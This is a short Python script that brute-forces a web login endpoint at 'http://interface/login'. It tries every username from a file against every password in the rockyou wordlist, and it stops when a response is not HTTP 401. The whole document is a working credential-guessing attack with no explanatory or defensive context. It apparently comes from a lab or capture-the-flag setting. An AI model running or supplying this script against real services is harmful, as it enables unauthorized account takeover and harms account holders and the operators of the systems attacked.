import requests, sys

users = open("users.txt").read().splitlines()
passwords = open("/usr/share/wordlists/rockyou.txt", errors="ignore").read().splitlines()

for user in users:
    for pw in passwords:
        r = requests.post("http://interface/login",
            json={"username": user, "password": pw},
            timeout=5)
        if r.status_code != 401:
            print(f"[+] {user}:{pw} -> HTTP {r.status_code}")
            sys.exit(0)
